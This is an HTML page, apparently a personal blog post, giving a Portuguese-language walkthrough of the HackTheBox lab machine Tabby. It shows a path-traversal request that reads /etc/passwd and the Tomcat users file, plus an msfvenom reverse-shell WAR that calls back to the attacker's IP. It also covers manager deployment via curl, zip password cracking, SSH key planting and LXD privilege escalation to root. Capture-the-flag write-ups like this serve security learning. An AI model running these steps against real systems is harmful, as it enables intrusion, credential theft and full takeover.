@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>tabby — htb writeup · chu@antisec</title>
+    <meta name="description" content="htb tabby — path traversal até tomcat-users.xml, deploy de war no manager, zip2john no backup e privesc via lxd.">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+  </head>
+  <body>
+    <a class="skip" href="#main">skip to content</a>
+
+    <header class="chrome">
+      <div class="wrap chrome-in">
+        <a class="brand" href="../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="main">
+          <ul>
+            <li><a href="../index.html">home</a></li>
+            <li><a href="../research/index.html">research</a></li>
+            <li><a href="index.html" aria-current="page">writeups</a></li>
+            <li><a href="../about.html">about</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">team</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <main id="main">
+      <article class="wrap hero">
+
+        <p class="crumbs"><a href="index.html">← ../</a> writeups</p>
+        <h1 class="h-prompt"><span class="ps1"><b>chu@antisec</b>:~/htb$</span> cat tabby.md</h1>
+        <div class="small dim">
+          <script src="https://www.hackthebox.eu/badge/148108"></script>
+        </div>
+        <p class="cmd">Tabby - HackTheBox - WriteUp</p>
+
+        <ul class="meta">
+          <li class="chip">date=2025-07-12</li>
+          <li class="chip">os=linux</li>
+          <li class="chip">ip=10.10.10.194</li>
+          <li class="chip">lang=pt-br</li>
+          <li class="chip chip--phos">status=root</li>
+        </ul>
+
+        <div class="prose">
+          <p>Back to all write-ups: <a href="index.html">here</a></p>
+
+          <figure class="fig">
+            <img src="https://i.imgur.com/sZmWkBU.png" alt="Tabby - HackTheBox - WriteUp" loading="lazy">
+            <figcaption class="fig-cap">Tabby - HackTheBox - WriteUp</figcaption>
+          </figure>
+
+          <p class="cmd"><span class="ps1"><b>chu@antisec</b>:~/htb$</span> cat tools.txt</p>
+          <p><strong>Tools</strong> utilizadas:</p>
+          <ul class="chips">
+            <li class="chip">nmap</li>
+            <li class="chip">BurpSuite</li>
+            <li class="chip">curl</li>
+            <li class="chip">Metasploit/msfvenom</li>
+            <li class="chip">John the Ripper/zip2john</li>
+          </ul>
+
+          <p>Iniciando com o nmap para procurar por portas e serviços rodando em nosso alvo:</p>
+
+          <div class="code">
+            <div class="code-cap"><span class="dot" aria-hidden="true">●</span> nmap</div>
+            <pre><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu)) 
+|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D 
+| http-methods:  
+|_  Supported Methods: GET HEAD POST OPTIONS 
+|_http-server-header: Apache/2.4.41 (Ubuntu) 
+|_http-title: Mega Hosting 
+8080/tcp open  http    Apache Tomcat 
+| http-methods:  
+|_  Supported Methods: OPTIONS GET HEAD POST 
+|_http-open-proxy: Proxy might be redirecting requests 
+|_http-title: Apache Tomcat 
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 
+TCP/IP fingerprint: 
+OS:SCAN(V=7.80%E=4%D=6/21%OT=22%CT=1%CU=41311%PV=Y%DS=2%DC=T%G=Y%TM=5EEF5C5 
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS 
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 
+OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN 
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A 
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R 
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F 
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% 
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD 
+OS:=S) 
+ 
+Uptime guess: 25.344 days (since Wed May 27 01:55:33 2020) 
+Network Distance: 2 hops 
+TCP Sequence Prediction: Difficulty=261 (Good luck!) 
+IP ID Sequence Generation: All zeros 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
+ 
+TRACEROUTE (using port 80/tcp) 
+HOP RTT       ADDRESS 
+1   157.85 ms 10.10.14.1 
+2   157.21 ms 10.10.10.194</code></pre>
+          </div>
+
+          <p>Vamos começar pelo serviço web da porta 80 http</p>
+
+          <figure class="fig">
+            <img src="https://i.imgur.com/CMz6njp.png" alt="Vamos começar pelo serviço web da porta 80 http" loading="lazy">
+            <figcaption class="fig-cap">Vamos começar pelo serviço web da porta 80 http</figcaption>
+          </figure>
+
+          <div class="code">
+            <div class="code-cap"><span class="dot" aria-hidden="true">●</span> url</div>
+            <pre><code>http://megahosting.htb/news.php?file=statement</code></pre>
+        </div>
+
+        <p>Ao acessar a página web, podemos ver que na aba 'INFRASTRUCTURE' nos mostra um link para megahosting.htb , portanto, precisamos adiciona-lo no arquivo /etc/hosts.</p>
+
+        <figure class="fig">
+          <img src="https://i.imgur.com/hvhe3st.png" alt="Ao acessar a página web, podemos ver que na aba &#x27;INFRASTRUCTURE&#x27; nos mostra um link para…" loading="lazy">
+          <figcaption class="fig-cap">Ao acessar a página web, podemos ver que na aba 'INFRASTRUCTURE' nos mostra um link para…</figcaption>
+        </figure>
+
+        <div class="code">
+          <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+          <pre><code>echo '10.10.10.194    megahosting.htb' &gt;&gt; /etc/hosts</code></pre>
+      </div>
+
+      <figure class="fig">
+        <img src="https://i.imgur.com/IwIpkom.png" alt="echo &#x27;10.10.10.194 megahosting.htb&#x27; &gt;&gt; /etc/hosts" loading="lazy">
+        <figcaption class="fig-cap">echo '10.10.10.194 megahosting.htb' &gt;&gt; /etc/hosts</figcaption>
+      </figure>
+
+      <div class="code">
+        <div class="code-cap"><span class="dot" aria-hidden="true">●</span> url</div>
+        <pre><code>http://megahosting.htb/news.php?file=../../../../etc/passwd</code></pre>
+    </div>
+
+    <p>Users found:</p>
+
+    <div class="code">
+      <div class="code-cap"><span class="dot" aria-hidden="true">●</span> output</div>
+      <pre><code>root
+ash</code></pre>
+    </div>
+
+    <figure class="fig">
+      <img src="https://i.imgur.com/lJrhRPD.png" alt="root" loading="lazy">
+      <figcaption class="fig-cap">root</figcaption>
+    </figure>
+
+    <p>Vamos dar uma olhada no que encontramos no outro serviço Web, na porta 8080. <a href="http://megahosting.htb:8080/">http://megahosting.htb:8080/</a></p>
+
+    <p>Ao acessar a pagina, vimos que é uma página default mas nos tras uma informação muito útil</p>
+
+    <p>A mensagem nos passa o caminho completo para um arquivo de usuários: /usr/share/tomcat9/etc/tomcat-users.xml</p>
+
+    <p>Vamos para o BurpSuite usando o Repeater para melhor interagir com o Path Transversal:</p>
+
+    <figure class="fig">
+      <img src="https://i.imgur.com/PkxZjwq.png" alt="Vamos para o BurpSuite usando o Repeater para melhor interagir com o Path Transversal" loading="lazy">
+      <figcaption class="fig-cap">Vamos para o BurpSuite usando o Repeater para melhor interagir com o Path Transversal</figcaption>
+    </figure>
+
+    <p>Nossa requisição:</p>
+
+    <div class="code">
+      <div class="code-cap"><span class="dot" aria-hidden="true">●</span> http</div>
+      <pre><code>GET /news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml HTTP/1.1
+Host: megahosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1</code></pre>
+    </div>
+
+    <p>A resposta da nossa requisição, contendo o usuário tomcat e sua senha.</p>
+
+    <div class="code">
+      <div class="code-cap"><span class="dot" aria-hidden="true">●</span> http</div>
+      <pre><code>HTTP/1.1 200 OK
+Date: Tue, 27 Oct 2020 01:48:43 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 2325
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+--&gt;
+&lt;tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              version="1.0"&gt;
+&lt;!--
+  NOTE:  By default, no user is included in the "manager-gui" role required
+  to operate the "/manager/html" web application.  If you wish to use this app,
+  you must define such a user - the username and password are arbitrary. It is
+  strongly recommended that you do NOT use one of the users in the commented out
+  section below since they are intended for use with the examples web
+  application.
+--&gt;
+&lt;!--
+  NOTE:  The sample user and role entries below are intended for use with the
+  examples web application. They are wrapped in a comment and thus are ignored
+  when reading this file. If you wish to configure these users for use with the
+  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
+  them. You will also need to set the passwords to something appropriate.
+--&gt;
+&lt;!--
+  &lt;role rolename="tomcat"/&gt;
+  &lt;role rolename="role1"/&gt;
+  &lt;user username="tomcat" password="&lt;must-be-changed&gt;" roles="tomcat"/&gt;
+  &lt;user username="both" password="&lt;must-be-changed&gt;" roles="tomcat,role1"/&gt;
+  &lt;user username="role1" password="&lt;must-be-changed&gt;" roles="role1"/&gt;
+--&gt;
+   &lt;role rolename="admin-gui"/&gt;
+   &lt;role rolename="manager-script"/&gt;
+   &lt;user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/&gt;
+&lt;/tomcat-users&gt;</code></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+      <pre><code> username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/&gt;</code></pre>
+  </div>
+
+  <p>tomcat : $3cureP4s5w0rd123!</p>
+
+  <p>Vamos tentar fazer um upload de uma shell agora que possuimos uma credencial.</p>
+
+  <p>Primeiro vamos criar uma shell do formato WAR usando o metasploit:</p>
+
+  <figure class="fig">
+    <img src="https://i.imgur.com/40AuMwa.png" alt="Primeiro vamos criar uma shell do formato WAR usando o metasploit" loading="lazy">
+    <figcaption class="fig-cap">Primeiro vamos criar uma shell do formato WAR usando o metasploit</figcaption>
+  </figure>
+
+  <div class="code">
+    <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+    <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.15.86" LPORT=1337 -f war &gt; shell.war</code></pre>
+</div>
+
+<p>Agora que já temos a nossa shell criada, vamos fazer o upload utilizando o curl:</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/0Ija6Yi.png" alt="Agora que já temos a nossa shell criada, vamos fazer o upload utilizando o curl" loading="lazy">
+  <figcaption class="fig-cap">Agora que já temos a nossa shell criada, vamos fazer o upload utilizando o curl</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/chu.war"  </code></pre>
+</div>
+
+<p>A resposta do site nos dizendo que o upload funcionou :D</p>
+
+<p>OK - Deployed application at context path [/chu.war]</p>
+
+<p>Agora vamos ao metasploit</p>
+
+<p>Vamos utilizar o handler (exploit/mult/handler)</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/MwXXX3p.png" alt="Vamos utilizar o handler (exploit/mult/handler)" loading="lazy">
+  <figcaption class="fig-cap">Vamos utilizar o handler (exploit/mult/handler)</figcaption>
+</figure>
+
+<p>Após seleciona-lo, setar o seu IP e a porta destinada para receber a Shell:</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/vSglXbJ.png" alt="Após seleciona-lo, setar o seu IP e a porta destinada para receber a Shell" loading="lazy">
+  <figcaption class="fig-cap">Após seleciona-lo, setar o seu IP e a porta destinada para receber a Shell</figcaption>
+</figure>
+
+<p>Ao acessar a página com nosso arquivo, recebemos a conexão: <a href="http://megahosting.htb:8080/chu.war">http://megahosting.htb:8080/chu.war</a></p>
+
+<p>Estamos como usuario tomcat</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/g1QqPdq.png" alt="Estamos como usuario tomcat" loading="lazy">
+  <figcaption class="fig-cap">Estamos como usuario tomcat</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)</code></pre>
+</div>
+
+<p>Melhorando a nossa shell utilizando Python3</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/O9VqEev.png" alt="Melhorando a nossa shell utilizando Python3" loading="lazy">
+  <figcaption class="fig-cap">Melhorando a nossa shell utilizando Python3</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+</div>
+
+<p>Ao procurar por arquivos na pasta do servidor web padrão, encontramos um arquivo nomeado como: 16162020_backup.zip</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/c371MR7.png" alt="Ao procurar por arquivos na pasta do servidor web padrão, encontramos um arquivo nomeado como:…" loading="lazy">
+  <figcaption class="fig-cap">Ao procurar por arquivos na pasta do servidor web padrão, encontramos um arquivo nomeado como:…</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>/var/www/html/files/16162020_backup.zip</code></pre>
+</div>
+
+<p>Vamos fazer o download para analisá-lo:</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/q15qgNp.png" alt="Vamos fazer o download para analisá-lo" loading="lazy">
+  <figcaption class="fig-cap">Vamos fazer o download para analisá-lo</figcaption>
+</figure>
+
+<p>O arquivo de backup está protegido por uma senha...</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/HXGfBuL.png" alt="O arquivo de backup está protegido por uma senha..." loading="lazy">
+  <figcaption class="fig-cap">O arquivo de backup está protegido por uma senha...</figcaption>
+</figure>
+
+<p>Vamos quebra-lá utilizando o John the Ripper, desta vez o zip2john</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/luHWLdc.png" alt="Vamos quebra-lá utilizando o John the Ripper, desta vez o zip2john" loading="lazy">
+  <figcaption class="fig-cap">Vamos quebra-lá utilizando o John the Ripper, desta vez o zip2john</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>zip2john 16162020_backup.zip &gt;&gt; hash.txt</code></pre>
+</div>
+
+<p>Agora possuimos a hash da senha do arquivo .zip</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/PLv7TCk.png" alt="Agora possuimos a hash da senha do arquivo .zip" loading="lazy">
+  <figcaption class="fig-cap">Agora possuimos a hash da senha do arquivo .zip</figcaption>
+</figure>
+
+<p>Portanto devemos quebra-la, utilizando o John</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/VicZnFZ.png" alt="Portanto devemos quebra-la, utilizando o John" loading="lazy">
+  <figcaption class="fig-cap">Portanto devemos quebra-la, utilizando o John</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>john --wordlist=../rockyou.txt hash.txt</code></pre>
+</div>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/dU0UaHU.png" alt="john --wordlist=../rockyou.txt hash.txt" loading="lazy">
+  <figcaption class="fig-cap">john --wordlist=../rockyou.txt hash.txt</figcaption>
+</figure>
+
+<p>Agora já podemos conferir o backup!</p>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> creds</div>
+  <pre><code>16162020_backup.zip:admin@it</code></pre>
+</div>
+
+<p>Ao analisar o backup encontrado, não fui capaz de encontrar nada de útil para prosseguir... Quando eu já estava achando que era uma toca de coelho, resolvi fazer um teste com a senha que tinha obtido...</p>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>su ash</code></pre>
+</div>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/mv4WiEl.png" alt="su ash" loading="lazy">
+  <figcaption class="fig-cap">su ash</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> creds</div>
+  <pre><code>ash:admin@it</code></pre>
+</div>
+
+<p>lol xD</p>
+
+<p>Melhorando a nossa shell: Ao se conectar no usuário Ash, que possui login SSH ativo, inserimos nossa chave rescém criada através do ssh-keygen</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/3x6WSRe.png" alt="Melhorando a nossa shell: Ao se conectar no usuário Ash, que possui login SSH ativo, inserimos…" loading="lazy">
+  <figcaption class="fig-cap">Melhorando a nossa shell: Ao se conectar no usuário Ash, que possui login SSH ativo, inserimos…</figcaption>
+</figure>
+
+<p>Agora vamos escreve-la no arquivo de autorização:</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/J2juZeX.png" alt="Agora vamos escreve-la no arquivo de autorização" loading="lazy">
+  <figcaption class="fig-cap">Agora vamos escreve-la no arquivo de autorização</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDhWQoPmDNNr5pl+pLhnkaYIzNOY2k2SpdbSXgNZ/tkYtpntQ7HoJaNhqe/vqzjjKtaNatr59AZQbJQGzf7vQnc6PXGtTeB6rQHKMyljbopTyhdkWPm7tSjN5XT9hl8qXGDtyEfgl5kwUtJScpIn0U16YWHkFs7ySSjFfN1FPEWePvQYIHhV5Nc85g/MM6uS97E/Chlnw64pKUEWxJ7RTnnk1SuAunLvmL1t2KxnkV4I4UZFE3s7ePkUJR/rbcw/K2SYoe2KHVK/QOtVSZijsD6VkSe2jVBOeu1xL3O71+pa5i6wbVbH/6mXRctWQyZP7cvZXMENwD3IUu5bUI6w2+lEGKqXLaeFYGy3o9seZI/W6TKQ1tIspdaoNwADIR9eR/8I3hgBdKlGrpDF3+uB8DVPN3EGyxq9n+atwKMPaPWu4jEf94g9ySiQtPrhTxy5jBsKE6sDvcDG3Cl/PtInP8oAjZLRGr8QylPkwqeOleZDnBPOJs40z5u97S8X70jck= root@antisec" &gt;&gt; authorized_keys</code></pre>
+</div>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>ssh ash@10.10.10.194 -i tabby</code></pre>
+</div>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/gwTA7ne.png" alt="ssh ash@10.10.10.194 -i tabby" loading="lazy">
+  <figcaption class="fig-cap">ssh ash@10.10.10.194 -i tabby</figcaption>
+</figure>
+
+<p>Pegando a flag de user. (user.txt)</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/BZkzUtS.png" alt="Pegando a flag de user. (user.txt)" loading="lazy">
+  <figcaption class="fig-cap">Pegando a flag de user. (user.txt)</figcaption>
+</figure>
+
+<p><strong>Escalação de Privilégio.</strong></p>
+
+<p>Ao logar no usuário ash, usando o comando id, podemos perceber que fazemos parte de um grupo interessante...</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/RjhcBjl.png" alt="Ao logar no usuário ash, usando o comando id, podemos perceber que fazemos parte de um grupo…" loading="lazy">
+  <figcaption class="fig-cap">Ao logar no usuário ash, usando o comando id, podemos perceber que fazemos parte de um grupo…</figcaption>
+</figure>
+
+<p>O artigo do Hacking Articles, nos dá uma boa pista: <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">link</a></p>
+
+<p>Em nossa máquina local criaremos a imagem que será importada no alvo:</p>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine</code></pre>
+</div>
+
+<p>Utilizamos um módulo de servidor HTTP do Python para hospedar:</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/3egnXWH.png" alt="Utilizamos um módulo de servidor HTTP do Python para hospedar" loading="lazy">
+  <figcaption class="fig-cap">Utilizamos um módulo de servidor HTTP do Python para hospedar</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>python -m SimpleHTTPServer 80 </code></pre>
+</div>
+
+<p>Após cria-la, devemos envia-lá, e como já possuimos shell, vamos usar o wget:</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/nFP28IH.png" alt="Após cria-la, devemos envia-lá, e como já possuimos shell, vamos usar o wget" loading="lazy">
+  <figcaption class="fig-cap">Após cria-la, devemos envia-lá, e como já possuimos shell, vamos usar o wget</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>wget 10.10.15.85/alpine-v3.12-x86_64-20201026_2224.tar.gz</code></pre>
+</div>
+
+<p>Para importar a imagem utilizamos o comando:</p>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>ash@tabby:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200626_1413.tar.gz --alias chu
+ash@tabby:/tmp$ lxc image list </code></pre>
+</div>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/KXpbQ74.png" alt="ash@tabby:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200626_1413.tar.gz --alias chu" loading="lazy">
+  <figcaption class="fig-cap">ash@tabby:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200626_1413.tar.gz --alias chu</figcaption>
+</figure>
+
+<p>Podemos ver que a imagem já está lá, agora precisamos usa-la</p>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/JWjGIxc.png" alt="Podemos ver que a imagem já está lá, agora precisamos usa-la" loading="lazy">
+  <figcaption class="fig-cap">Podemos ver que a imagem já está lá, agora precisamos usa-la</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>ash@tabby:/tmp$ lxc init chu writeup -c security.privileged=true
+Creating ignite 
+ash@tabby:/tmp$ lxc config device add writeup chu disk source=/ path=/mnt/root recursive=true 
+Device chu added to writeup 
+ash@tabby:/tmp$ lxc start writeup 
+ash@tabby:/tmp$ lxc exec writeup /bin/sh 
+~ # id 
+uid=0(root) gid=0(root)</code></pre>
+</div>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/Ys6XDcM.png" alt="ash@tabby:/tmp$ lxc init chu writeup -c security.privileged=true" loading="lazy">
+  <figcaption class="fig-cap">ash@tabby:/tmp$ lxc init chu writeup -c security.privileged=true</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
+  <pre><code>cd /mnt/root/root
+cat root.txt
+d357855fa703d1378270d7740b2258d2</code></pre>
+</div>
+
+<figure class="fig">
+  <img src="https://i.imgur.com/j1WQB0s.png" alt="cd /mnt/root/root" loading="lazy">
+  <figcaption class="fig-cap">cd /mnt/root/root</figcaption>
+</figure>
+
+<p>if i helped you, add + respect at my profile :D</p>
+
+<div class="small dim">
+  <script src="https://www.hackthebox.eu/badge/148108"></script>
+</div>
+
+<p>My references:</p>
+
+<div class="code">
+  <div class="code-cap"><span class="dot" aria-hidden="true">●</span> references</div>
+  <pre><code>http://www.andradesoto.com.br/2017/02/28/a-vulnerabilidade-path-traversal/
+https://www.abraweb.com.br/index.php/artigos/ataques-de-path-transversal
+https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/
+https://tomcat.apache.org/tomcat-7.0-doc/host-manager-howto.html
+https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script
+https://www.hackingarticles.in/lxd-privilege-escalation/
+https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/</code></pre>
+</div>
+
+<p>see ya</p>
+</div>
+
+<nav class="post-nav" aria-label="writeup navigation">
+  <span>← prev:</span><a href="forge.html">forge</a>
+  <span>next →</span><a href="coder.html">coder</a>
+  <span>·</span><a href="index.html">todas as writeups</a>
+</nav>
+
+</article>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="foot-row">
+      <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
+    </div>
+    <div class="foot-row">
+      <p>← <a href="index.html">writeups</a> · <a href="../about.html">about</a> · <a href="../about.html#contact">contact</a></p>
+    </div>
+  </div>
+</footer>
+<script src="../zoom.js" defer></script>
+</body>
+</html>
